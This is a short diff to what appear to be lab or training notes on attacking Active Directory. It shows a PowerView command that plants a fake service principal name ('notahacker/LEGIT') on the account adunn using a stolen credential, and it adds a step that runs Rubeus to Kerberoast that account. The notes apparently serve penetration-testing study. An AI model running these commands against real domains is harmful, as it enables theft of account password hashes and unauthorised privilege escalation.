@@ -257,3 +257,8 @@ Since we added `damundsen` to the `Help Desk Level 1` group, we inherited ri
 Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
 ```
 
+#### Kerberoasting with Rubeus
+
+```powershell
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+```
